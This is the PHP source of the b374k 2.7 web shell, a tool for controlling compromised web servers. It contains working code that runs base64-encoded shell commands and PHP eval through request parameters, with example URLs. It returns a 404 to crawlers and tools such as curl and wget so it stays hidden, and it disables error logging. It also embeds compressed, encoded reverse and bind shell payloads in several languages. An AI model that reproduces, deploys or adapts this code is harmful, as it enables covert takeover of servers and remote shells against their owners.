<?php
/*
	b374k 2.7
	Jayalah Indonesiaku
	(c)2013
	http://code.google.com/p/b374k-shell

*/
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k

$s_ver = "2.7"; // shell ver
$s_title = "b374k ".$s_ver; // shell title
$s_login_time = 3600 * 24 * 7; // cookie time (login)
$s_debug = false; // debugging mode

@ob_start();
@set_time_limit(0);
@ini_set('html_errors','0');
@clearstatcache();
define('DS', DIRECTORY_SEPARATOR);

// clean magic quotes
$_POST = clean($_POST);
$_GET = clean($_GET);
$_COOKIE = clean($_COOKIE);
$_GP = array_merge($_POST, $_GET);

if($s_debug){
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
	@ini_set('display_errors','1');
	@ini_set('log_errors','1');
	foreach($_GP as $k=>$v) echo "<span>".hss($k."=>".$v)."</span><br />";
}
else{
	error_reporting(0);
	@ini_set('display_errors','0');
	@ini_set('log_errors','0');
}

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_GP['login'])){
		$s_login = strtolower(md5(trim($_GP['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("b374k",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_GP['x']) && ($_GP['x']=='logout')){
		$persist = array("theme", "cwd");
		$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
		foreach($_COOKIE as $s_k=>$s_v){
			if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,"",time() - $s_login_time);
		}
		$s_auth = false;
		if(!empty($s_reload)) header("Location: ".$s_reload);
	}
}
else $s_auth = true;

// This is a feature where you can control this script from another apps/scripts
// you need to supply password (in md5 format) to access this
// this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)
// give the code/command you want to execute in base64 format
// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
// example:
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
// recommended ways is using POST DATA
// note that it will not works if shell password is empty ($s_pass);
// better see code below
if(!empty($_GP['s_pass'])){
	if(strtolower(trim($s_pass)) == strtolower(trim($_GP['s_pass']))){
		if(isset($_GP['cmd'])) echo exe(base64_decode($_GP['cmd']));
		elseif(isset($_GP['eval'])){
			$s_code = base64_decode($_GP['eval']);
			ob_start();
			eval($s_code);
			$s_res = ob_get_contents();
			ob_end_clean();
			echo $s_res;
		}
		else echo $s_title;
	}
	die();
}

// block search engine bot
if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}
elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}

// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$s_rs_pl ="lZLxj5MwGIZ/Xv+KyvU2SLhj80xMVllcGJrlvLHQncY4JQw+BzlGCe3pzG7+7bbIOaIxUX7q9/bL8zZPOHvi3Iva2eSlA+UXXEFdoDOcSVmJseMkPIXLLefbAi4TvnMqZ3P1/NndhcigKBx0LwDPg/GY8eQOJEWEC5d8CtRBZK4B+4rXEq/88MbdS6h3dMlG7mBNlu9m68mAtvcqpE2/yPBFblCUfzY16PvO+arS3Do0tHMvuGFL3zvHzrVBj4hIdwuyqrnkm29lvANzIJNqYFEkmteYzO4vX0Xzhb+y+yzwriO2Cv3pjU2k9fCQ5mBaTdXLafj6reuOrAPqkcolevww/EhRT4DUKF5pFgveRJqiaCyIQv+W+dPZLLRHitJTr0/Vjt6O07SO8tIklT1f6I1ounhvnRp7RS4klGr7qhPGSQKqxrOZ1RQrnGcbjWvcuMZjnPCyhERCui4Ne6j3eAUlZqvZfGEbL/qeQR+D4HZlG5Nu4odhm6Ae7CHByumpPim4ANOz6M8D+3XQ7M6guJ1JMa0Gl0s8pAgdERTiZPTpn0ZJ1k6jZsrdvAQZxZIrX1lHB4nd31ySvHPdmlAOSdyJG23s37SZrbZJnxkWfUxab92oFaejv5v7L2GNJjhobab6e45IfT8A";
$s_rs_py = "lVRtT9swEP6c/IpgpmGrwaGFaVJZKiEIE9qAqu20D8Cq1LkmEalt2S6Ufz87SV9ATGiqWveee3vOd+f9vWipVTQreQT8KZAvphDc3w8KY6TuRxETGdBciLwCysQiktHs+OvJ46EuoKoiv1xIoUygINTLmVSCgdah0KF+sV/BHsGEplyAL2OE/ML9ZDAPamfMSN/3nE+89aVDIYFjFtYm8UQtbWSTiaV5ZXQ1TBwMSr0Hl/wtSnxPgVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fUYdbRSekw4KBrtCbyvZPFBpcNmfC5s6cDflJM+ol/r0lGWlgD3h7lHvxPHyYMVAmkYrU61rrI3iucpsCViRwVEDeLNYAdWQKlZgxLL7AN/9udcPHYJCFc6rNNfO4Or7ze0oOT8bJ6Rxs4FmbYT2umRqClrqrFR4RnMllhJ3CVnbuAtjxRtlq7ONAZ7hdT9aeEvaOrvRqOdJkZ2kSxOkPKsrsv9dTW0oJ/mbIEE7FpeplZpur3P1NzOD7jnqWJI5GPbsxgMNkJ/Htsk0VfmT395cTuK450Y6zu+6Dz5UO/jxFvcKe/ac3uaHVWlsuXY/Sm6wJL6Om7WhzYFb6exyenWTTNqdouPb8x/T8WSUnF1bF1uYcQohN/bj259TZ7TrMh0lv8bJ2cXFKLQZ35DW1E5ghjE6ovUHhdLdtqZVaUeZ4y+vPFw5btAC2znBOTCDcdF4bIfMLT7VFYB03pumvbdBnm6ag+rHpXkfgn7QxobMNsA1bdP3D8xRZ3dg2vXVxG/9HXP7xKQktg1kji7+F/HuR8TZ/xH/wPxd4oz4fwE=";
$s_rs_rb = "tVZrb9s2FP1M/QqWySprcaSm6zDMmWL0sQ4FVtRI0w1DlRU2dW0RkUmNpOoUSfbbx5ccu7aTDNhoGJTuPbxP3mPvPcpaJbMJ4xnwz1i2ky/RHq60btQgy6goIZ0JMashpWKeNdnkux+eXRyqCuo6iyT81TIJOFaCXoCObwXNWFd8PIc4ikqYYtXSCxUhCbqVHJ9+ePHHp9Gvz89evzt9m5ZiwelYQTofa1r14rlaMH5tv3PGZ4s4GWrZwmA6rhVEwEtvUcK4tk56SsvEWM7NHiE2xa+ZiRUumdJqGJRGOwrxpBwWTpp2BlItPpnQrGF73EWKdQUcy1ymM9VOelmRZX1SFCTBDhbSkD4ac+j56S+/pTXwma7y/CjCZlnRxyfn+d/Znx+fHP54fnXU//5mPxs2+RuuYQayFxDJwASr3RmVn70cvQf5GaSLk5B+kzgNzVU6phQaD6RpIxnXmLhuYNcNPMBUcA5UQ1lw4nATmDHunuwygXKhQy/wyprm1FaBrQnhEihWzs+0R+CyEVLjs59P3+aXGuT8ePT+KI+L/dHvr4qT+DjojfDY3SVV4UOGi5+Kx9+UuDhx21O/k/7UfpKlN7CNXXXdpbfsMUlJckBOyBpqUZlO49rEPgO9npBdcswUYJBSyBdS2ORr24ySQSGH+9kGPlSnTmkl5k2eE7IBCTBrh5Y4/TZjWyF21Xkd7o5BZqwfx4k3vPNEd3VLMz9UC/ll2KuTnWjvY1mge5CvmDTejeW7gPYy79I9rCNLS7UKZSoWgzvLtC1pX6cHJ3Qf/D9NC3aaevMubUQDvFf3iSTJ1TUT1515JizblAfEzOXBhq+b7c62hP21bPW9e5agaHt77w35LekFuGrlbQYqpbVYyUjlnNVRZ8v3cI3YnjqC3EFsxtEmtR0baZW7t6Nzw7G2gCEgT7ie8dyPh2e8vavqxrEeUg/gOOQJDqE1akMITQ1fOkZD1t3/TWSoy2wZ9OaFMsqOsJQnLCNB95CUix9tYSYU5KtU5GRoN/Gg7tAWmkHd4VVGCcI18vAi1zu37kzY1eUrJtgdRTfIm27XNf/GOQTktulUD5zONadh91v4M7B14FCYNhulnzPz5CYMhfHyk+fAVvIP";
$s_rs_js = "nVHLasMwEDwrkH8wvliGVIImUEjIqZ/QY/rAkTeWqCy5kpwUQv69kuykebSl2Afh3Zmd3Z2lNOHONXZOKdMlkErrSgJhuqYNXU8fZu93loOUdDzaFiaxTbFTyTIx8NEKAzhjXMjyrTGagbVZTiJh0ZEVuHOqD7O8h6wzUNTnaJc5EZhWVku4aNWlIqVXCZN5SkbXQlHLM4+IDe6nIY0s3EabmtSFYxzT151niTz/rmN1SeATQl3SSRam2nrkKBHCTjT8EQmqcny5nOb78QgFPvdkvxhhfnoHT2C2YPCmVcwJrbCNPGTJzggHOI2G9u3nYUcFzEH5rNKwVNJ/3WpeOJqJI/0ct5xYVwpFDNi2BpxfQ7p1xHdPy8IV6eQ4TYJDnO+P08RocbhVBmMGlv9Vdhz6php1LydSWAcqOr26fwnJw3gE0kJy7f/s5L+98P+xczRY36tM4kVX0yj330Og3y6AfrAeDfQcDTQbDXP58AU=";
$s_rs_c = "rVJhb9owEP0Mv8JjU+tQFxPaaVJpKqFCJbQVEGSapg1FwTHEqrGj2EzQqf99thMYYdqkSf0Q5e7d8zv73uEmSLXO1A3GRCa0tZJyxWmLyDXO8OLqw/XTpUop5xg0cf0tE4RvEgpulU6YbKV3FShnYnWKJZwtTrCdwnqXUfUnrCR5orqKC6qZ+TATVXwjmFG3GBMarGMmoA3ifEUQSeMcNE3449vc+1mv2YJCBMnA79Zr5qIbYgDTLE6SPGICMAOzJbSHg6Bjj9RYSzERLeM147ug9xANR4Owe8Azmesg1VIoGGvJoOvlzz3vN8Vqt5T7OSaHw1Gv359GvdFXR1NB8V5YqqPZ+P5jNAung94jahcUqi1HZhoqU/4UWYpjRtPB59nA6qEziRR7pnIJZdl/Cd8oj26ZhoXMgonECMCTl4Omd8ZQe+sXLG4GSoXhvXcpCWJCqOvcPlzH6BDUcHsB3F6AG0CkEJRomnwXDdS5LrnJJusYbiXxj5NOIbkzTdewQbd2pCAcTB+Drab5ujuZ+cH5u8mX/t15t6wayISUAGxehFUKLlmjuCuXikJi45d6jXJFwcHOq9e30y6kiwpiZ15M+Znmco8gM2tuprknXPgXx8he+587MJxMpuNwHIX3k72vsBz2X90sN+Gk5nnebft4I5yT6j+cVNXEP05e30lVOPlS/wU=";
$s_rs_java = "lVRNb9swDD2nQP+DkJM9ZHaTDdjWIsOwYYcBA1osvXXBoMiMrdWWBIn5Qpr/PkqWXXftpQfbEvlEPj5SznNWIRp3medCF5CVWpc1ZEI3uclX7z68v3/rKqjr/PxMNkZbZH/5lmdSZ2+unpoUYLCdn5nNqpaCiZo7x0KMP9Ydz89GxsotR2AOORJgLRWvI8wggz2CKhy7rSzwwuP7Az+U2eACyd4w6a6GrusNPvr0BgMDcrccDCZPz06eHUiPWEmXSTenyGFJxrmPdGpDfbnegrWygEHcrZYFsxuVpIHnCO2hXYxWB4S7JVuxOVOwY2H7cfpptrxq/VIhE+SkPL7MZJVGx66SNSTi8/wiZTHWiFhkOysRktXkYiI6aLCv642rkt70YsxT+LRvwVFUyfe9AINSKwbpETJSUZEWXNzfWi6AwgWwf7XVx3pjx0LZDZcqIf2kKqlQbkvXiuAr8+MQcrd+JpqCeI3zlVS5q8bBJdfJ4uAQmqwEvLHagMVDMtYuU7yBcZqh/ql3YL9xR4QyqQrYX6+T8U6qcerlOcao9Bm3fGO2nbeGgWNhaNklE1opEAjFb9VmH/Rn5wl8pb2LMi60uAdkVexdu42+vsNE39ec1aBKrObzaRyBUbgKc5pVhBJsZrh1QJuAvrtYdj1ZgKV5iqlcl2pgTHygDu25uIwL37Wu2W0/oXbA/iczey2ZVjhpCBtc0+Ug8UAEaSZswOv0shTs4YG9zGd4C0vpy668+gNzP8pPLmipe+zQ3oPJ392QzkQjJcD/Uujgr41C2YA/Hpc0UbAHkdDwpPFfQWrR5E5jwaSzeUZt4ol0CTx69ogu/V/FPGfYw6cZXR/r22dm/fJRxvB6xe2k5/QP";
$s_rs_win = "7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/fe+r619lm/Vfbae/+x9zphG9UACgAAtJZhGAAqga9EBf57kmnZwLraALiud9+mEhF63yZqK1cCisTCBDGDD7IYAoEQApkcUCwVgFwBGBAeCfKFbI4zgaBvO5ODHggAoQgUYE+zCPtP3h6AiMIhkN4AqFVIWhYBgHrfzISFM9VN48ivdSNm6v+NSmdivpq1BM7opN9x0h8Xoc1HQQD/47SWHu3624foDwUh/7a/PVo/t/8s47f1z/q7H/Wrn/vviyuc8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD+EH/KllQEutq2YNFoOsYDqNWUP9A1wc8f08W6kS4VYYcT4VfknAbpSsJ1pbGtu4KExznKe1+MZ9SMYAibzW4qfRTo5V++bBxAF62KANMUTXNvKywmJqphA0MLpWXPle9CFir9Sfay/MBq3j0j16tCa3d6vxAGVNACAJ5iDVebViN/go2fMMYAC7Xq+oJ3u8juL6wRLt3CinGyMhBbj/A9YNiQtNRXpSs+MWT5alWNh6X9cmyNSRec/kQ+iSBmw4TZxJwLGLeGT7UvvshvkzfFNKJph6ENvkd1zX0PTX2pei19o7nhq4O9AgX6WhrdX19jqUagIUkkVEq+NSTAqBLL2iv7Yc3pKygz1wm3zv5tRF8cZmlqzZoD2QLQVO3Xv5nV4Yh1aV7n0nmAkNjvH4ZQtnra2WDEDHMc7u41azE2p1OqL+7/og4zHTeFNENqYH/Zz5avjYkBSoIjkNMGuV0GqFbNV1JtI+C50QSqn6Fjre9zn7ez9ezcb7Y1VY4/fDn1WfPPcPz69esiK/fO2rXM69cdyU/GTN0DD1tLaoSKRlVBcn4VZpm/4vWHiyfiJa9bcoxIBL00tEdiqvN8GXpzkIKck+9n9nqH3DduLyKDXBTwitSlaI7fPzoYBurU+bjSVDl9n0uWPnA2Pdygh1/khxow81u0HEnc3xtDBjAiXbNeEh67alfbUcaqAL9whURCHMy5Phg/qDFtuD24G/Kqz+gYzCke7EUr16vv19YS+1YAs1OV/PIFXfEtHiuIFc2Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1B4JNoaRelt6kM2dPLRSMMA7xw5+53VO1wvDRaMnE2NXngUYhivDmbsHMzZrD6LDeP088aSrb+51nzYi5/WINhF//AzRsBBpxP28Zeo5lcRlsetr2UttsruMkWRFmYYhal2rDVJASm/h/bN+pG2VNMZyMLCgSnPPWw/c9DiJsPvazvTOpvIao4Y5u2xLY1rhq1bKrlm/D2dNTZnx7+8P2B3isjazfvFPoBxNLd+49NGRYHN50cPZ7dtoRNcoUuHTMYJyRCJIPbskoq25eSUj4See38sCvgCLSC8nx7W5BmkN0I2c1DUp7FqUlwZK6uK5VgNO+YxfVH54Yd50N7lwbk32wPdokuo5xbrP/ldT9nuL90IblFRwzUN4FwCfWBBrEi14pY3tS7D64dyRjK7oRCiuZn7qZ+h1VtQciWjQjrP8+Vmmh0svc4+eeiKPh/+WvMZenPY8u6+U8tiXsCnwc0QO+avTqaK1DfSBCaM64d5++ll2RbLzXDVJppLE6ibtvcrj6Gtewj8amT8iZ5OlZHiv/RwvyF/nUhBZ5vyjwJY1zZapou6G2hlWaOnuRAXTO2PcWWr2l6y7bOz48O/Qa3+FUFrpleoF/g1v4DjvKd24cdtr8SzwQfK5djhEKD8WZEj5yAtzdZxCMm/pSCQ040WsoWGszbnaaLBhBYZHrwBxtS1ls0OH5LmDp5yIEqewdKnZ/Ltvvqpg28f5VomULgJdt4UyH9LKKdcGgNflNMk0zSbGqbl4ADEI/3B3+ulx/LVsSMRUknFc8U6Z8UD6UEZfTW7nKS0kCJH/BraF0V0jOW8g/Yhnf5x+V2iZSu1IuDj8pvOKCTbBf20ozieLS6J25Ug1bErdCYuxBpMdYgyKXNo4M0QN27O+iQ5sgJrF9/7KB+8V3PVk/vz8XR4cu9xkhj3qqbdrB9Ecn1eZdk9G3Po2uvVnZ21lU20Kyc0FkYi6mkqRHHOxkvDXA1szPslb4YibIezoGlVspvbuuNS8kNrbRJepJypOYeVh2rNOrGZ8ZmQ0uyppwkeXW5ivSecjjavAqdjxhRklBG8qbPa4sSanTufLygH7pQ3P1sIuxB+36HjHp5KhYRvrO8qoQVYeKGtyPKK+B9llfWaTys5R9BKBWNhVLrKgajHR7qkrp7IT8jQWT4Tw/w0T56W5S476PfdndGxowgfnFR+khrD5EGrgwNn01e5XBHRVlCrTqhWtt7in1wMFFT50TKtqQgMKM3iIUo7yRjdO7Q4LNHWXeYsDviY1+vpsSgdOP4QbhWDdSfLzqssR/IOG4iZC1d14VX0c9TQWMcKVtFIPW3ycsf8vnJSz9UWo7ZlEzBuTmX62uFF4xUngXEYXi2fAgtf7S9Kb5FOk5st7gz6nebtGpTa1RQc6KfiwJrNjie4Y9QknPcJqUjB1yuHzAnYPNAOjKpuVHOI4JtmqxDoXxv05qL4/COT4o1GY1jcUgkZF/XPn9DA/qEcJmR7KPevLvx5eA5LHhqrn78QDfkM1vRDq0gH+GIUquHd0lJGgqFlN3wEHLuzMgqv4Xw5+lJ+zRziBTvS1mdPH1DS+not7rW0l/KSaNR8yD6uEedrCGHuAdCP5c+cZbvy+uyVUP4R9hlRYgmHAZDF2yYF136slbF+NS0pj/QJb3xh8RUaJwhPZN5p95KL8e/8+cNDz3pYKUujxp88PE10VDL47irIXYxV7JPdx1P83UMTmtf++BTk5t+eJzG4OK43ojPy8GYyVVZj96slC2hnVM8IGKq8fwpuTddOu/KZEmBzubX6kM0Was5cwM6xQZNo4zZ7fsla+BexemqM6U0xfN5SYok68D6qw78OtnCOf9ql0dNZa+J/+7Bq8tgwgCd0lSF889Meno98EILCtfib6q0CF9drmvvGozlVROXvtINLbTqvLEuJkeqczWzv2K+Fep1sOKlzZ19CLOf5G/B9ebGX+SNtD0kn5HhhYkXfMQdTQ7nn+9H7414Dez6dnB5XKlPE0RNFsxDhV4KcLV+sy7XeJl+4AZjb+XbdseT2FDKdyeymlbTNhJpmng1LiW5Q9Pudox+htbS2LnmE3bH/oLM4VKxcVY/Rq4HOJGTNA77z1ZU3yIpXtxTYm/SjeVp72aFtzIw7fcM3FvBrj4ssxe0Cx9jfEIz8ykpox0MgDnAmNSa5KV78rUSX3i9WCvdz1/K1srWw8dvVmoHUL1XNu2zlRc37cPeLDrYg3ePhkwKS1+IkDchkpHhUMN7SRqlk9axDICtzy88CEREhkW2f4HhSCCCwxdCHDCSI07ksjgSMIwhYCTgZV6gqfVC9FyqLup86/xeOGgNgsdlJrC2xUqcd2vj2DweELsyMTaCk8CVQByxP48hkXAkRMdKcv5mL1MjVObU8ClnZxektjuAuHyOi8hByhY6iTnwIDzFE7KcWdbruGJIyuCtkYakgPYMNlvsaN4BD4ILmCgJdydHGG/PdHAIQi5OnFq8h+Xk6YxwcznCMoIrYKILSyiI5ya4cD28F+NSEvhcQYKTZCsD5g8I+WwnNgNiiFxjFoBz/YVSHlvYCY8L7CDQHBJzOYkcUMA4BYrAIP/U1AfV/lHgYhBECflz5eOl9d2OTsuOg76+hbGxXEBZgI91iA1kCyuivewlfDxr69zdw6vZgsmdgJNlaMhy/4lBGN4QFBayOsgpMNgpKiDMzSlyZejKOVHBEU6zycZxY+s93I8V63/LM+oF1shKOUcsqCVx6HjHc6VtFFQAc+Njz7DHvIx9lxrullTx2pl2Qx9ReNYcLei5YHFwNG/anKE+W9d1f7wsrHecFaTLRs1eMG32XEHfyPwtOlmWe9C50zMsr7ikkr2qkZt3dns76lXfyJdOz/tlWI4paO/OGY5iLFqIssHNj4wDfMsCX5DjtN1Y3ElS9BFUSxyKrlOOBE4gzzjqHYfvwmWyNQgam02DhHyav5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJmSyw/g2rDKKs7WcMUp8ZHSCI4AMv78rNlqrWDrBnbJDyKIKxRcrpp9/QKvxYJM2uyF26Z7QAJ5bUimtRGLMN+HYSfPRfvzhBIO9nO8//GLhuTqcNGuMGxlZqS/LbEUDGizpBnqnCxI94fEvGDxDyabZkvuD2ROjPkamECpqCXvJaKN5eHXfHy/L2uNjU2BXiYtIvO4jgkSAxGy8Vb5M7lHl4AQzxfsFLq85thLYhkiQyhFRNz1Ps/maRx2y/P7eZtEGAemjpdB/YepAWcfBlNox4AwQq4mbxFOL37OwUMsbN2igJNZvF8wHD5LlHI/vnOLhJtwgHeulhyx3ih+32AkLRLc7oDr+faFNxTGKl7NlDS+Zz5kSezwuYJCszMVzm+2mkDMlCaD7oEy2VYBT/cXHvMia3BYI9kqhdjCJD1tj/0Udt2ZEorQ0TbZc79219sFYR+0HTYZRGJIhiSbM6Jr51ypOJNrTRY7It9QRHhR3bUOhwVWVBKG5L7TxppACtbN7yh5s9C5GMJgZ6nPuGxaTL6dR49z7pjY5ZM+jn5iavfjqdoYqmmDs9i+AUFK+Hgg325OHNWZWXXycgwYrqbLHML7X2EPcc3jzidZkOXoRW4PpltVQ0ANAPDvPWpcnbGMCqjqNPtheL0Gp87VXbEHE4TolGKUVvKhT4ad4sHK6Xb9D4hhA6JTMizVm1ElvW5t8j6UmHCrB6uNlo/AEKT48Y/+bX9SpCDtL8Y/JZPfQmZ9Bj7AsPwRQkV2kX/+lEjMRS7XFhUinehnwTCsViLljWgFRt6Clvejk35BPOwP1cJbFBNVcm03Xto3WiI1kfkhpBNKTPytPuytBtKu2w6TiJGLmp9VdUAcACgxeg0QRRmLVmW7Tm8H4gNd3oKFj7K130dyMUHYBqhL8ev64NGStfDRrVpQ645RoORNaM0b+GiyFlCW8LRSm20Ehmum/wHQo7ahI9fDT1W7T2u3SwZmyuLsM6PpUfRpMJqhCrCVbQN8bks/ygdk/ZgsGAb+n/6v0/FCAGAX/hn7XqvL/oKVafU9f8Fqtbq68L/O26rFn2n5vZbHtYwuAoBZRV9t4MzoPDN6zoyrAiNWB4Z6uDsHhIYCtIB1NHrIjMKXJLLEkPP082J9pHvsDAoAoUIGO5TLFDPEKTQA0N4/2quJpb2sxByJBABmnhJaDOKwoN91Gk/70vhdWyHmcLSZpm+y6eDfAoFwEUcw8/TR5o3lCpkAwOQK2P87zvzf";
$s_rs_php = "7VVNb+M2ED3bgP+DlhUQCVUsyy6wQFxmL+2xwKIt0MMmFWSKsghLIsuhai+a/PcORcnWOk6yaLe9tDBikzOcx/l4fPn2nSrVbPqVVxqj4CaOmcz5fCvltuJzJutYxZvV229211DyqopnU6611KnmSmojmm2wCNezKXCTGlHztBK1MM4mN6moVSWYMGlRtVAG1jqb+ibTW26oD6kGt14frUD5QVWYQkA8EvVGG+czoMlq9dYu9xlt2qqyS35aQkkJBmNa3s/f//gDPRiu6/X7nxJ6dee//+W726t170bbOt6IJobSuxbEBteUdGV6XZnejcdk03BmeH7XkC5tUQRMto0JhkxDSpPwj9l04ivqH+uY+JgG6RYGMUWT280j9q0CfgljeYYBHxb3Pc7RktwfATO26wG7lIq2YUbIJuUHAQaCK8UaU6WF1LursEcWOT1ZuyFMMLKz0+skxEgTJGOzMy0Gk5IgDimOGEQehGcxQyKYXF+uuxUoGM2zOgXJdsgO4Pp3rgNimEKSLebd54bMfRX5SKlGdj8Y0906xPa0ki22DKKVS8lnZ9gZY1zZE0PG6Dayknu8ENoN7gIkedo2Wc2DMFpEqxDLIHvRuGQnxV4LwwOfRX49x46zPRY6J7ekA5zsS1GhV72htMhwjC7Izqyw48E4d65rlubbtM4MKwMSs/zOCz78egf3X4exQD5jsVqHffzEz3OK+368Ll5AmgsdoCsMWTkse78v6Tg7Z33svnt6GS3qcfm+6kq18yLew4P3jP+3Fv2ht8Gu7tZHPA/v4wdbOV6H72D+9PJR56TLskunYJUEfmzMsHUDsics/JPWu8N+DjTTOvsYLOitWxAlFCcR0SSMknPjHo3LC8YeTWmqtGSpVLzBDMoI8XEQQjk/9uwN9lxzkK1mtlacz+hJjKm4qZBvVvNsOD7TaPHKkeT1I8uXj7DB6zhodDuwzz5+Lgvb44cHt3JXhuFojL7O+mbaDvc59Rf3rDreW6HeBRgQocDia8wiq6wnZosmPSHp7MRiQQtEyDs7g4Grw2D7VvkiHNP1E7whrYugg/MpMnsVdPkS6PKzQB/P+Dti9rB0FX66T872Q7c7Kg52PTyH078HJ6NW5AcZLazIOfKWnYDwBv+OYvg31A7+otrBf17t4LLavSBv8L+8XToCr8sbfKa8wReTN3hGNODflTf4J+TtHPQ5efsimvbu9k8=";
$s_favicon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKYSURBVDjLnZPJT1NRFMb5G1wDHV5boNiqdHrvFYolCAtsGSSWKpMFKhYqlDI6oAEKaVJwCIgSphaKtLYWCgSNBgRjMNHoxsSFS3cmJmA0NMTw+R6JKKZl4eJL7sm953fOd3JPHIC4WMpcppG5SGnZc8ZjVVF6QLn975sDgfaZmvg71oRJZIRUYcuAnq/2KWroGfm3QwEn2YpLVPPvOD2oiqj9yq/mGznegl56mx6T7ZbY1M6YAM0CuZkxT0b2Wg6QW/SsApRXDsotR+d6E9Y/h9DuqoCuJq0lKoDxqU1/pITGR27mBU4h+GEcTz5OY+ClA5JbyahYzof/9TBO9B/FcWcqpA4xU3We3GJ87ntnfO5meinMvruNnqcmXA2XoDVcCc0wCYkzBaZpA7ILRJ/2O2B87jA+QT9UeDRe8svZYAG8b/txc6kc9mA+yqayYPQXwvdmBEOrA5B2p0BtFIYOWKCm5RukWwZyXIbA+0F0LpaiKaBHmVsLw4we99ccsM8a8GClF5JOMcQdou8prULrgRmQo7KI0VcE13MrGv06lE5kodhzGvdWu2GdKkTVWC4DcELcJkKyXbCb1EhAVM//M0DVUNqP2qAJd1baUDaZjTMTeXAttsPi0cM0mgvHvA0NkxYk2QRIrieOsDmEmXttH0DfVfSluSToWmpD8bgOroUOWNw6VI7koGfOBuq6EqLLTNU6ojrmP5D1HVsjmrkYezGIrlA9LjKgnrlGXJlpgbCOD0EtD0QNN8I3cZqjAlhJr4rXpB1iNLhrYffUQWoT7yUKzbxqJlHLq0jc5JYmgHMunogKYJVqF7mTrPyfgktMRTMX/CrOq1gLF3fYNrLiX+Bs8MoTwT2fQPwXgBXHGL+TaIjfinb3C7cscRMIcYL6AAAAAElFTkSuQmCC";
$s_arrow = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsSAAALEgHS3X78AAAEYElEQVRYw8VXS0xcVRj+z7kv5tF5MPfOo1AgkFBKoQPuFAyxstKkcWHjGhOjcacxujMxaqtx48b4iDExxiZuXBVdtEURN00qDBMgTUOmnTEMc+/ce4d5c+k957gZEKYCd5DSb3tOzv+d//0hcACO47hgsL07HA5fDIfDkz6ffxQAogDgblypMcZypVIpYRj6DVVVZ0zTSBNCyGFvo4MOMca8LMsjvb19r8uy8iLGOAIA+JA3KaVU1XV9OpVa/VrX9QSl1G6ZgM/ni5w7N/iuooSnMMZBOAIopQVN0767e3fls1KppDoigBCCrq6ukf7+gS9cLtfTh3nJAVi9Xr+dTCbf1LTcAmNsb3ibjXd394wPDQ1fE0UxfgzGAQCQIAid0Whs8uHDrflisZjZl8Dp052jw8PxazzP9cExA2PcHgopE7Va7Y9yuZR7hIDP54uMjj71gySJF+AxAWPcHgwGh3U9f92yrOoOAYwxF4+PvB8IBF9u0e02AFAHlbEDQRA63W43zWbXf2eMMQwA0NHROaoo4VdbeYgxZmUy6SuZTPojxthmK46QZeU1WQ5d2O4x3MDA4Ader3esFePp9IMrS0tLn2iaNieKIvH7A88ghHhHWYmQWxQltL6e/ZULheTe/v7+qwjhU60YX15e/pQQ22KMEsMwbrdKwuVyxQoF82eup6fvcigUesVJ7Bljm+n0g6vbxnc1HKLrrZFACHksy1rhBgfPv9fW1jbk8OePGP/3fIeE7fcHxhyQQBijOhePj3wIAHIrbt//Xmue4HmB586eHfgYAKSj/vz/eAJjLPAA4DlonhSLpe9V